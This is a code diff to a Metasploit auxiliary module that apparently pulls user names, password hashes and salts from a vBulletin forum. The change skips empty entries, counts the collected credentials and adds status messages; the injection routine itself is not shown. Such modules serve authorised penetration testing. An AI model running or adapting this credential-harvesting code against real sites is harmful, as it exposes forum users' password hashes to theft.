@@ -160,7 +160,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
     count_users = data.to_i
-    print_good("#{peer} - #{count_users} users found")
+    print_good("#{peer} - #{count_users} users found. Collecting credentials...")
 
     users_table = Rex::Ui::Text::Table.new(
       'Header'  => 'vBulletin Users',
@@ -170,19 +170,26 @@ class Metasploit3 < Msf::Auxiliary
 
     for i in 0..count_users
       user = get_user_data(node_id, i)
-      report_auth_info({
-       :host => rhost,
-       :port => rport,
-       :user => user[0],
-       :pass => user[1],
-       :type => "hash",
-       :sname => (ssl ? "https" : "http"),
-       :proof => "salt: #{user[2]}" # Using proof to store the hash salt
-      })
-      users_table << user
+      unless user.join.empty?
+        report_auth_info({
+         :host => rhost,
+         :port => rport,
+         :user => user[0],
+         :pass => user[1],
+         :type => "hash",
+         :sname => (ssl ? "https" : "http"),
+         :proof => "salt: #{user[2]}" # Using proof to store the hash salt
+        })
+        users_table << user
+      end
     end
 
-    print_line(users_table.to_s)
+    if users_table.rows.length > 0
+      print_good("#{users_table.rows.length.to_s} credentials successfully collected")
+      print_line(users_table.to_s)
+    else
+      print_error("Unfortunately the module was unable to extract any credentials")
+    end
   end
 
 
